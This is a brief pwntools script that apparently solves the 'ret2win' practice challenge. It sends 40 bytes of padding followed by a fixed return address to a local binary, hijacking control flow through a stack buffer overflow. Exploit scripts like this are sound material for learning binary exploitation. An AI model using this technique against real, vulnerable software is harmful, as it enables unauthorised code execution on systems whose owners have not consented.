from pwn import *

context.bits = 64;
overwrite = b"A"*40;
win_addr = 0x400756;

payload = overwrite;
payload += p64(win_addr);

p = process("./ret2win");
p.send(payload);
p.interactive();


